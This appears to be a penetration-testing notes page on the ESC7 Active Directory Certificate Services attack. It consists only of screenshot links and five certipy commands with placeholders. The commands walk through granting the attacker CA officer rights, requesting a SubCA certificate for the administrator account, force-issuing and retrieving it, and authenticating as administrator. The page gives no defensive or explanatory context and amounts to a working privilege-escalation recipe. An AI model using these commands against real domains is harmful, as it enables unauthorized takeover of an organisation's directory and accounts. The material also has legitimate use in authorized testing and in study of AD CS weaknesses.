![image 414.png](../../assets/ESC7/image%20414.png)
- certipy ca -ca <CA> -add-officer <user> -username <user>@<domain> -p <pass>
  
  
![image 1 309.png](../../assets/ESC7/image%201%20309.png)
- certipy req -ca <CA> -target <target_machine> -template SubCA -upn administrator@<domain> -username <user>@<domain> -p <pass>
  
  
![image 2 260.png](../../assets/ESC7/image%202%20260.png)
- certipy ca -ca <CA> -issue-request <issue_id> -username <user>@<domain> -p <pass>
  
  
![image 3 222.png](../../assets/ESC7/image%203%20222.png)
- certipy req -ca <CA> -target <target_machine> -retrieve <issue_id> -username <user>@<domain> -p <pass>
  
  
![image 4 193.png](../../assets/ESC7/image%204%20193.png)
- certipy auth -pfx administrator.pfx -dc-ip <IP>